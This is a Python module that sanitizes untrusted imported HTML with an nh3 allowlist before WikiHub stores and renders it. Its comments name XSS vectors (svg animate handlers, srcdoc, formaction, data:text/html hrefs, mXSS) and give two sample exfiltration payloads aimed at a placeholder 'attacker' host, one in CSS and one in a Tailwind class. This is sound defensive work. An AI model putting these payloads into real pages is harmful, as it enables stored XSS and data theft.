"""Allowlist sanitizer for imported document HTML.

Everything that reaches this module is untrusted: a `.docx` is a zip anyone can
author, and a `.html` upload is attacker-controlled by definition. The output is
stored in `pages.content` *and* in `page_revisions.content`, and the page-history
modal renders revision content with `dangerouslySetInnerHTML`
(`frontend/components/pages/page-history-modal.tsx`). That is a live sink, so
this is stored-XSS territory, not a theoretical concern.

Why `nh3` (Rust `ammonia`) rather than the hand-rolled BeautifulSoup pass in
`app/modules/pages/export_content.py`: that one is a *denylist* - it deletes
known-bad tags and `on*` attributes. Denylists lose to `<svg><animate onbegin>`,
`<meta http-equiv=refresh>`, `srcdoc`, `formaction`, `data:text/html` hrefs, and
above all to mXSS, where BeautifulSoup's parse tree and the browser's disagree
about what the markup even is. An allowlist built on the same html5ever parser
browsers use does not have that class of gap. The export-path denylist stays
where it is as a second layer; this is the one that has to be right.

This runs *after* pandoc, which is itself a whitelist: every format is read with
the `raw_html` extension disabled, and pandoc's AST has no node for `<script>`,
event handlers or `<iframe>`, so most payloads never survive to get here.
"""

from __future__ import annotations

import re

import nh3

#: Tags the Tiptap editor can render. Anything outside this set is unwrapped
#: (its text is kept) rather than dropped, except for `CLEAN_CONTENT_TAGS`.
ALLOWED_TAGS: frozenset[str] = frozenset(
    {
        # blocks
        "p", "br", "hr", "blockquote", "pre", "div",
        "h1", "h2", "h3", "h4", "h5", "h6",
        # inline marks
        "strong", "b", "em", "i", "u", "s", "del", "code", "span", "sub", "sup", "mark",
        # lists - `input` only for the task-list checkbox shape
        "ul", "ol", "li", "input",
        # links and images
        "a", "img",
        # tables
        "table", "thead", "tbody", "tfoot", "tr", "th", "td",
    }
)

#: Tags whose *content* goes too. Unwrapping a `<script>` would leave its source
#: behind as visible page text, which is noise at best.
CLEAN_CONTENT_TAGS: frozenset[str] = frozenset({"script", "style", "title", "textarea"})

#: `rel` is deliberately absent: nh3 adds `noopener noreferrer` to every link
#: itself, and listing it here would disable that.
ALLOWED_ATTRIBUTES: dict[str, set[str]] = {
    "a": {"href", "title", "download", "data-attachment", "data-display-mode",
          "data-attachment-href", "data-filename", "class"},
    "img": {"src", "alt", "title", "width", "height", "data-caption", "data-alignment"},
    "pre": {"class"},
    "code": {"class"},
    "span": {"class", "data-type"},
    "div": {"class", "data-type", "data-callout-type", "data-open"},
    "ul": {"class", "data-type"},
    "ol": {"class", "start", "type"},
    "li": {"class", "data-type", "data-checked"},
    # `disabled` and `checked` only; a task-list checkbox is decoration, and
    # `name`/`value`/`formaction` have no business in page content.
    "input": {"type", "checked", "disabled", "class"},
    "th": {"colspan", "rowspan", "style"},
    "td": {"colspan", "rowspan", "style"},
    "table": {"class"},
    "p": {"style", "class"},
    "h1": {"style"}, "h2": {"style"}, "h3": {"style"},
    "h4": {"style"}, "h5": {"style"}, "h6": {"style"},
}

#: Only these schemes survive on `href`/`src`. Relative URLs pass through
#: untouched (nh3's default), which is what `/api/v1/attachments/<id>/content`
#: needs. Note what is missing: `data:` (a `data:text/html` href is a
#: same-origin script), `javascript:`, `vbscript:`, `file:`.
ALLOWED_URL_SCHEMES: frozenset[str] = frozenset({"http", "https", "mailto"})

#: `style` is allowed on exactly the tags above, and then only `text-align`
#: survives - that is the one declaration WikiHub's own editor round-trips
#: (Tiptap's TextAlign extension) and the one pandoc emits for table cells.
#: Everything else in a `style` attribute is dropped, which closes off CSS-based
#: exfiltration (`background: url(https://attacker/?c=...)`) without losing
#: alignment from the source document.
ALLOWED_STYLE_PROPERTIES: frozenset[str] = frozenset({"text-align"})

#: A class token we are willing to keep. `.`, `/` and `:` are allowed because
#: WikiHub's own task-list markup (`app/modules/pages/tiptap_html.py`) is
#: Tailwind - `space-y-1.5`, `border-primary/20`, `md:flex`. What is ruled out
#: is brackets, parens and quotes, which is what a Tailwind arbitrary value
#: (`bg-[url(https://attacker/)]`) needs to smuggle a URL through a class name.
_SAFE_CLASS_TOKEN = re.compile(r"^[A-Za-z0-9_:./-]{1,64}$")

#: Guards against a pathological class list being used as a payload carrier.
#: Sized against the longest legitimate list we emit, with headroom.
_MAX_CLASS_TOKENS = 16


def _filter_attribute(_tag: str, attribute: str, value: str) -> str | None:
    """Last-pass value filter, applied to attributes that already passed the allowlist."""
    if attribute == "class":
        tokens = [t for t in value.split() if _SAFE_CLASS_TOKEN.match(t)]
        return " ".join(tokens[:_MAX_CLASS_TOKENS]) or None
    return value


_CLEANER = nh3.Cleaner(
    tags=set(ALLOWED_TAGS),
    clean_content_tags=set(CLEAN_CONTENT_TAGS),
    attributes=ALLOWED_ATTRIBUTES,
    attribute_filter=_filter_attribute,
    url_schemes=set(ALLOWED_URL_SCHEMES),
    filter_style_properties=set(ALLOWED_STYLE_PROPERTIES),
    strip_comments=True,
)


def sanitize_imported_html(html: str) -> str:
    """Return `html` reduced to markup WikiHub is willing to store and render."""
    if not html:
        return ""
    return _CLEANER.clean(html)
